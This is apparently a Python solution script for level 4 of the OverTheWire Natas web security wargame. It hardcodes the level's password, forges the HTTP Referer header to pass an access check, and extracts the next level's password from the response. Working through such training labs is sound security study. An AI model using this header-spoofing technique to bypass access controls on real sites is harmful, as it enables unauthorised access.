#!/usr/bin/env python3

import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

# We need a referer from natas5
headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }

url = 'http://%s.natas.labs.overthewire.org/' % username

response = requests.get(url, auth = (username, password), headers = headers)
content = response.text

print(re.findall('natas5 is (.*)', content)[0])